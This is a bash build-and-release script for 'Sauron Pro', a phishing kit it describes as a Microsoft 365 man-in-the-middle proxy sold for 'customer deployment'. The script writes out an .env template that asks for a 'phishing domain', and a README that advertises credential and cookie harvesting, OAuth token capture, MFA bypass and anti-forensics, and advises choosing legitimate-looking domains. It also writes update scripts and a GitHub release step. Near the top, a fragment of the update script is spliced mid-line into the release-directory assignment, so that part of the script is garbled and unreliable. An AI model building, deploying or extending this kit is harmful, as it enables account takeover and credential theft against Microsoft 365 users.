#!/bin/bash
set -e

# Auto-detect version from git tags or use default
if [ -z "$1" ]; then
    # Try to get latest git tag, fallback to date-based version
    if git describe --tags --exact-match HEAD 2>/dev/null; then
        VERSION=$(git describe --tags --exact-match HEAD)
    else
        VERSION="v$(date +%Y.%m.%d)-$(git rev-parse --short HEAD)"
    fi
    echo "üè∑Ô∏è  Auto-detected version: $VERSION"
else
    VERSION="$1"
    echo "üè∑Ô∏è  Using provided version: $VERSION"
fi

RELEA# Check if we're running from within the extracted directory (manual update)
if [ -f "./sauron" ]; then
    echo "ÔøΩ Using binary from current directory..."
    binary_source="./sauron"
    
    # When using local binary, get the version from it directly
    local_version=$(./sauron --version 2>/dev/null | grep -o 'v[0-9]\+\.[0-9]\+\.[0-9]\+.*' || echo "unknown")
    echo "üìä Local binary version: $local_version"
    
    # Skip version comparison for local updates
    echo "‚ÑπÔ∏è  Performing manual update with local binary..."
else
    # Auto-download mode
    echo "üÜï Update available: $current_version ‚Üí $latest_version"
    echo "üì• Downloading latest release automatically..."
    
    download_dir=$(download_latest_release "$latest_version")
    binary_source="$download_dir/sauron"
    
    # Cleanup function
    cleanup() {
        if [ -n "$download_dir" ] && [ -d "$download_dir" ]; then
            rm -rf "$download_dir"
        fi
    }
    trap cleanup EXIT
fiSION"
BUILD_DIR="$RELEASE_DIR/sauron"

echo "üöÄ Building Sauron Release Package $VERSION"
echo "üì¶ Creating release directory: $RELEASE_DIR"

# Clean previous builds
rm -rf "$RELEASE_DIR"
mkdir -p "$BUILD_DIR"

# ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Build Binary ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
echo "üî® Building optimized Go binary..."

# Check if we're cross-compiling or building natively
if [[ "$OSTYPE" == "linux-gnu"* ]]; then
    # Native Linux build with CGO
    echo "üêß Building on Linux (native)"
    CGO_ENABLED=1 go build \
        -ldflags="-w -s -X main.version=$VERSION" \
        -o "$BUILD_DIR/sauron" \
        main.go
else
    # Cross-compile from macOS/Windows - disable CGO for SQLite
    echo "üçé Cross-compiling for Linux (CGO disabled)"
    CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build \
        -ldflags="-w -s -X main.version=$VERSION" \
        -tags="sqlite_omit_load_extension" \
        -o "$BUILD_DIR/sauron" \
        main.go
fi

# Make binary executable
chmod +x "$BUILD_DIR/sauron"

echo "‚úÖ Binary built: $(du -h "$BUILD_DIR/sauron" | cut -f1)"

# ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Copy Essential Files ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
echo "üìÅ Copying essential files..."

# Installation files
cp -r install/ "$BUILD_DIR/"

# Configuration script
cp scripts/configure-env.sh "$BUILD_DIR/"
chmod +x "$BUILD_DIR/configure-env.sh"

# Help script
cp scripts/help.sh "$BUILD_DIR/"
chmod +x "$BUILD_DIR/help.sh"

# Enhanced verification script
cp scripts/verify-installation.sh "$BUILD_DIR/" 2>/dev/null || echo "Creating verify-installation.sh..."
chmod +x "$BUILD_DIR/verify-installation.sh"

# Configuration files (if they exist)
if [ -d "config/" ]; then
    cp -r config/ "$BUILD_DIR/"
fi

# Static assets and data
mkdir -p "$BUILD_DIR/geo"
if [ -f "geo/GeoLite2-Country.mmdb" ]; then
    cp geo/GeoLite2-Country.mmdb "$BUILD_DIR/geo/"
fi

mkdir -p "$BUILD_DIR/data"
if [ -f "data/slug_stats.json" ]; then
    cp data/slug_stats.json "$BUILD_DIR/data/"
fi

# TLS directory structure
mkdir -p "$BUILD_DIR/tls/certs"

# Logs directory
mkdir -p "$BUILD_DIR/logs"

# ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Create Example Environment File ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
cat > "$BUILD_DIR/.env.example" << 'ENV_EOF'
# Sauron Production Configuration
# Copy this to .env and fill in your values

# Your phishing domain (must be registered and point to this server)
SAURON_DOMAIN=microsoftlogin365.com

# Cloudflare API token for automatic SSL certificates
CLOUDFLARE_API_TOKEN=your_cloudflare_api_token_here

# Turnstile configuration (get from Cloudflare dashboard)
TURNSTILE_SECRET=your_turnstile_secret_here

# Optional: License token secret (for premium features)
LICENSE_TOKEN_SECRET=your_license_secret_here

# Optional: Use staging certificates for testing
# STAGING=true

# Optional: Development mode (disables some security features)
# DEV_MODE=false
ENV_EOF

# ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Create Documentation ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
cat > "$BUILD_DIR/README.md" << 'README_EOF'
# üöÄ Sauron Pro - Production Deployment

**Microsoft 365 MITM Proxy System** - Professional deployment package for enterprise operations.

---

## ‚ö° Ultra-Fast Setup (3 minutes)

### Step 1: Prerequisites ‚úÖ
- **Ubuntu 20.04+** VPS with root access
- **Domain registered** and pointed to your server IP
- **Cloudflare account** (free tier works)

### Step 2: Upload & Extract üì¶
```bash
# Upload the .tar.gz file to your VPS, then:
tar -xzf sauron-*.tar.gz
cd sauron
```

### Step 3: One-Command Setup üîß
```bash
# This script handles EVERYTHING automatically:
sudo ./install-production.sh
```

**That's it!** The installer will:
- ‚úÖ Install Docker (if needed)
- ‚úÖ Install system dependencies 
- ‚úÖ Guide you through Cloudflare setup
- ‚úÖ Configure SSL certificates automatically
- ‚úÖ Start all services
- ‚úÖ Verify everything works

---

## üîß What the Installer Does

The `install-production.sh` script is **fully automated** and handles:

1. **System Setup**: Installs Docker, Redis, SSL tools
2. **Interactive Configuration**: Walks you through Cloudflare setup
3. **Domain Validation**: Checks your DNS configuration
4. **SSL Automation**: Sets up Let's Encrypt certificates
5. **Service Deployment**: Starts Sauron with proper configuration
6. **Health Checks**: Verifies everything is running correctly

---

## üåê Configuration Made Simple

The installer includes an **interactive setup wizard** that asks you:

1. **Your phishing domain** (e.g., `microsoftlogin365.com`)
2. **Cloudflare API token** (we'll show you how to get it)
3. **Turnstile settings** (optional, for bot protection)

**No manual .env editing needed!** The wizard creates everything for you.

---

## üìä Management Dashboard

Once installed, access your admin panel at:
```
https://yourdomain.com/admin
```

### Quick Status Commands
```bash
# Check if everything is running
sudo systemctl status sauron

# View real-time logs
sudo journalctl -u sauron -f

# Restart if needed
sudo systemctl restart sauron
```

---

## üéØ System Capabilities

### **Real-Time Microsoft 365 Interception**
- OAuth2 flow capture with token extraction
- Multi-factor authentication bypass
- Session synchronization across devices
- Real-time credential harvesting

### **Advanced Bot Detection**
- Headless browser detection
- Automation framework identification  
- IP reputation filtering
- Behavioral analysis

### **Enterprise Management**
- **Slug-based operations** for campaign isolation
- **WebSocket interface** for real-time control
- **Statistics tracking** and analytics
- **Admin controls** with risk management

### **Security Features**
- **TLS interception** with real certificate validation
- **Cookie harvesting** from Microsoft authentication
- **Session state management** across multiple flows
- **Anti-forensics** and memory protection

---

## üîó API Reference

| Endpoint | Purpose | Method |
|----------|---------|---------|
| `/login` | Credential verification | GET |
| `/common/oauth2/v2.0/token` | OAuth2 token capture | POST |
| `/common/SAS/ProcessAuth` | 2FA/MFA bypass | POST |
| `/stats` | Slug analytics | GET |
| `/ws` | Real-time management | WebSocket |
| `/admin/*` | Enterprise controls | POST |

---

## üõ°Ô∏è Security Best Practices

- **Domain Selection**: Use legitimate-looking domains (avoid obvious phishing patterns)
- **Log Monitoring**: Check logs regularly for detection attempts
- **Update Schedule**: Keep system and certificates updated
- **Access Control**: Restrict admin panel access to trusted IPs

---

## üÜò Troubleshooting

### Common Issues & Solutions

**üî¥ "Domain not pointing to server"**
```bash
# Check DNS propagation
dig yourdomain.com
# Should show your server IP
```

**üî¥ "Cloudflare API token invalid"**
- Ensure token has `Zone:Edit` permissions
- Check token isn't expired in Cloudflare dashboard

**üî¥ "SSL certificate failed"**
```bash
# Check acme.sh status
sudo acme.sh --list
# Retry certificate generation
sudo acme.sh --issue -d yourdomain.com --dns dns_cf
```

**üî¥ "Service won't start"**
```bash
# Check detailed logs
sudo journalctl -u sauron --no-pager -l
```

---

## üîÑ Updates

Update to newer versions:
```bash
# Stop current version
sudo systemctl stop sauron

# Extract new version
tar -xzf sauron-new-version.tar.gz
cd sauron

# Run update script
sudo ./update-sauron.sh
```

---

## üìû Support

For technical support or questions:
- Check the troubleshooting section above
- Review system logs for specific error messages
- Verify all prerequisites are met

**üéØ Professional deployment in under 3 minutes!**
README_EOF

# ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Create Verification Script ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
cat > "$BUILD_DIR/verify-installation.sh" << 'VERIFY_EOF'
#!/bin/bash

echo "üîç Verifying Sauron Installation..."

# Check if binary exists and is executable
if [ -x "/usr/local/bin/sauron" ]; then
    echo "‚úÖ Sauron binary installed"
    echo "üìä Binary size: $(du -h /usr/local/bin/sauron | cut -f1)"
else
    echo "‚ùå Sauron binary not found or not executable"
fi

# Check systemd service
if systemctl is-enabled sauron.service >/dev/null 2>&1; then
    echo "‚úÖ Sauron service enabled"
    
    if systemctl is-active sauron.service >/dev/null 2>&1; then
        echo "‚úÖ Sauron service running"
    else
        echo "‚ö†Ô∏è Sauron service not running"
        echo "üîß Try: sudo systemctl start sauron"
    fi
else
    echo "‚ùå Sauron service not enabled"
fi

# Check Redis
if systemctl is-active redis-server >/dev/null 2>&1; then
    echo "‚úÖ Redis server running"
else
    echo "‚ùå Redis server not running"
fi

# Check acme.sh
if [ -x "/usr/local/bin/acme.sh" ]; then
    echo "‚úÖ acme.sh installed"
else
    echo "‚ùå acme.sh not found"
fi

# Check .env file
if [ -f ".env" ]; then
    echo "‚úÖ Environment file exists"
    
    # Check required variables
    source .env
    if [ -n "$SAURON_DOMAIN" ]; then
        echo "‚úÖ SAURON_DOMAIN configured: $SAURON_DOMAIN"
    else
        echo "‚ùå SAURON_DOMAIN not set"
    fi
    
    if [ -n "$CLOUDFLARE_API_TOKEN" ]; then
        echo "‚úÖ CLOUDFLARE_API_TOKEN configured"
    else
        echo "‚ùå CLOUDFLARE_API_TOKEN not set"
    fi
else
    echo "‚ùå .env file not found"
fi

echo "üîç Verification complete"
VERIFY_EOF

chmod +x "$BUILD_DIR/verify-installation.sh"

# ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Create Update Script ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
cat > "$BUILD_DIR/update-sauron.sh" << 'UPDATE_EOF'
#!/bin/bash
set -e

echo "üîÑ Sauron Auto-Updater"
echo "‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ"

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo "‚ùå This script must be run as root (use sudo)"
   exit 1
fi

# Function to get current installed version
get_current_version() {
    if [ -f "/usr/local/bin/sauron" ]; then
        /usr/local/bin/sauron --version 2>/dev/null | grep -o 'v[0-9]\+\.[0-9]\+\.[0-9]\+.*' || echo "unknown"
    else
        echo "not-installed"
    fi
}

# Function to get latest GitHub release version
get_latest_version() {
    curl -s "https://api.github.com/repos/Skillz147/Sauron-Pro/releases/latest" | \
    grep '"tag_name":' | \
    sed -E 's/.*"([^"]+)".*/\1/' 2>/dev/null || echo "unknown"
}

# Function to download and extract latest release
download_latest_release() {
    local version="$1"
    local temp_dir="/tmp/sauron-update-$$"
    
    echo "üì• Downloading Sauron $version..."
    mkdir -p "$temp_dir"
    cd "$temp_dir"
    
    # Download latest release
    if ! wget -q "https://github.com/Skillz147/Sauron-Pro/releases/latest/download/sauron-linux-amd64.tar.gz"; then
        echo "‚ùå Failed to download release"
        rm -rf "$temp_dir"
        exit 1
    fi
    
    echo "üì¶ Extracting release..."
    if ! tar -xzf sauron-linux-amd64.tar.gz; then
        echo "‚ùå Failed to extract release"
        rm -rf "$temp_dir"
        exit 1
    fi
    
    # Check if binary exists in extracted files
    if [ ! -f "sauron/sauron" ]; then
        echo "‚ùå Binary not found in release package"
        rm -rf "$temp_dir"
        exit 1
    fi
    
    echo "$temp_dir/sauron"
}

# Check for updates mode
if [ "$1" = "--check" ] || [ "$1" = "check" ]; then
    echo "üîç Checking for updates..."
    
    current_version=$(get_current_version)
    latest_version=$(get_latest_version)
    
    echo "üìä Current version: $current_version"
    echo "üìä Latest version:  $latest_version"
    
    if [ "$current_version" = "$latest_version" ]; then
        echo "‚úÖ You have the latest version!"
        exit 0
    elif [ "$latest_version" = "unknown" ]; then
        echo "‚ö†Ô∏è  Unable to check for updates (network issue?)"
        exit 1
    else
        echo "üÜï Update available: $current_version ‚Üí $latest_version"
        echo ""
        echo "Run 'sudo ./update-sauron.sh' to update automatically"
        exit 0
    fi
fi

# Check for force flag
FORCE_UPDATE=false
if [ "$1" = "--force" ] || [ "$1" = "force" ]; then
    FORCE_UPDATE=true
    echo "üîÑ Force update mode enabled"
fi

# Auto-update mode (default)
echo "üîç Checking for updates..."

current_version=$(get_current_version)
latest_version=$(get_latest_version)

echo "üìä Current version: $current_version"
echo "üìä Latest version:  $latest_version"

# Check if update is needed
if [ "$current_version" = "$latest_version" ] && [ "$latest_version" != "unknown" ] && [ "$FORCE_UPDATE" = false ]; then
    echo "‚úÖ Already running the latest version ($current_version)"
    echo "üîç Check status: systemctl status sauron"
    echo "üí° Use --force to reinstall anyway"
    exit 0
fi

if [ "$latest_version" = "unknown" ]; then
    echo "‚ö†Ô∏è  Unable to fetch latest version from GitHub"
    echo "üìã Manual update steps:"
    echo "   1. Download: wget https://github.com/Skillz147/Sauron-Pro/releases/latest/download/sauron-linux-amd64.tar.gz"
    echo "   2. Extract: tar -xzf sauron-linux-amd64.tar.gz"
    echo "   3. Update: cd sauron && sudo ./update-sauron.sh"
    exit 1
fi

# Check if we're running from within the extracted directory (manual update)
if [ -f "./sauron" ]; then
    echo "ÔøΩ Using binary from current directory..."
    binary_source="./sauron"
else
    # Auto-download mode
    echo "üÜï Update available: $current_version ‚Üí $latest_version"
    echo "üì• Downloading latest release automatically..."
    
    download_dir=$(download_latest_release "$latest_version")
    binary_source="$download_dir/sauron"
    
    # Cleanup function
    cleanup() {
        if [ -n "$download_dir" ] && [ -d "$download_dir" ]; then
            rm -rf "$download_dir"
        fi
    }
    trap cleanup EXIT
fi

# Stop service
echo "‚èπÔ∏è  Stopping Sauron service..."
if systemctl is-active sauron.service >/dev/null 2>&1; then
    systemctl stop sauron.service
    echo "‚úÖ Service stopped"
else
    echo "‚ÑπÔ∏è  Service was not running"
fi

# Backup current binary
if [ -f "/usr/local/bin/sauron" ]; then
    backup_file="/usr/local/bin/sauron.backup.$(date +%Y%m%d_%H%M%S)"
    echo "üíæ Backing up current binary to $backup_file"
    cp /usr/local/bin/sauron "$backup_file"
fi

# Install new binary
echo "üì¶ Installing new binary..."
cp "$binary_source" /usr/local/bin/sauron
chmod +x /usr/local/bin/sauron

# Verify installation
new_version=$(/usr/local/bin/sauron --version 2>/dev/null | grep -o 'v[0-9]\+\.[0-9]\+\.[0-9]\+.*' || echo "unknown")
echo "‚úÖ Installed version: $new_version"

# Restart service
echo "üöÄ Starting Sauron service..."
systemctl start sauron.service

# Wait a moment and check status
sleep 2
if systemctl is-active sauron.service >/dev/null 2>&1; then
    echo "‚úÖ Sauron updated successfully!"
    echo "üìä Updated: $current_version ‚Üí $new_version"
else
    echo "‚ùå Service failed to start!"
    echo "üîç Check logs: sudo journalctl -u sauron -f"
    exit 1
fi

echo ""
echo "üéØ Update Complete!"
echo "‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ"
echo "üîç Status: systemctl status sauron"
echo "üìã Logs:   sudo journalctl -u sauron -f"
echo "üåê Access: https://$(hostname -f)/admin"
UPDATE_EOF

chmod +x "$BUILD_DIR/update-sauron.sh"

# ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Create Archive ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
echo "üì¶ Creating release archive..."
cd "$RELEASE_DIR"

# Create both versioned and latest archives
tar -czf "sauron-$VERSION-linux-amd64.tar.gz" sauron/
tar -czf "sauron-linux-amd64.tar.gz" sauron/

cd ..

# Show release info
echo ""
echo "üéâ Release package created successfully!"
echo "üìÅ Location: $RELEASE_DIR/"
echo "üì¶ Versioned: $RELEASE_DIR/sauron-$VERSION-linux-amd64.tar.gz"
echo "üì¶ Latest: $RELEASE_DIR/sauron-linux-amd64.tar.gz"
echo "üíæ Archive size: $(du -h "$RELEASE_DIR/sauron-linux-amd64.tar.gz" | cut -f1)"
echo ""
echo "üöÄ CUSTOMER DEPLOYMENT (Ultra-Simple):"
echo "‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ"
echo "1Ô∏è‚É£  Upload: sauron-linux-amd64.tar.gz to VPS"
echo "2Ô∏è‚É£  Extract: tar -xzf sauron-linux-amd64.tar.gz"
echo "3Ô∏è‚É£  Enter: cd sauron"
echo "4Ô∏è‚É£  Install: sudo ./install-production.sh"
echo ""
echo "‚ú® That's it! The installer handles everything automatically."
echo "üéØ 3-minute professional deployment guaranteed."
echo ""

# ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Interactive GitHub Release ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
echo "‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ"
echo "üì§ GITHUB RELEASE"
echo "‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ"
echo ""
read -p "ü§î Do you want to push this release to GitHub now? [y/N]: " -n 1 -r
echo ""

if [[ $REPLY =~ ^[Yy]$ ]]; then
    echo ""
    echo "üöÄ Pushing release to GitHub..."
    
    # Create git tag if it doesn't exist
    if ! git tag -l | grep -q "^$VERSION$"; then
        echo "üè∑Ô∏è  Creating git tag: $VERSION"
        git tag "$VERSION" -m "Sauron release $VERSION"
    fi
    
    # Push tag to GitHub
    echo "üì§ Pushing tag to GitHub..."
    git push sauron-pro "$VERSION"
    
    # Check if GitHub CLI is available
    if command -v gh >/dev/null 2>&1; then
        echo "üì¶ Creating GitHub release with files..."
        
        # Create release with both files
        gh release create "$VERSION" \
            --repo "Skillz147/Sauron-Pro" \
            --title "Sauron Release $VERSION" \
            --notes "Automated release build $VERSION

## üöÄ Installation
\`\`\`bash
wget https://github.com/Skillz147/Sauron-Pro/releases/latest/download/sauron-linux-amd64.tar.gz
tar -xzf sauron-linux-amd64.tar.gz
cd sauron
sudo ./install-production.sh
\`\`\`

## üì¶ Package Contents
- Compiled binary (no source code)
- Automated installer with Docker support
- Interactive Cloudflare setup wizard
- Professional deployment documentation

**3-minute deployment guaranteed!**" \
            "$RELEASE_DIR/sauron-$VERSION-linux-amd64.tar.gz" \
            "$RELEASE_DIR/sauron-linux-amd64.tar.gz"
        
        echo ""
        echo "‚úÖ GitHub release created successfully!"
        echo "üåê View at: https://github.com/Skillz147/Sauron-Pro/releases/tag/$VERSION"
        
    else
        echo ""
        echo "‚ö†Ô∏è  GitHub CLI (gh) not found."
        echo "üìã Manual steps:"
        echo "   1. Go to: https://github.com/Skillz147/Sauron-Pro/releases/new"
        echo "   2. Select tag: $VERSION"
        echo "   3. Upload both files:"
        echo "      - $RELEASE_DIR/sauron-$VERSION-linux-amd64.tar.gz"
        echo "      - $RELEASE_DIR/sauron-linux-amd64.tar.gz"
    fi
    
else
    echo ""
    echo "‚è≠Ô∏è  Skipping GitHub push."
    echo "üìã To push later:"
    echo "   git tag $VERSION -m 'Sauron release $VERSION'"
    echo "   git push sauron-pro $VERSION"
    echo "   # Then create release at: https://github.com/Skillz147/Sauron-Pro/releases/new"
fi

echo ""
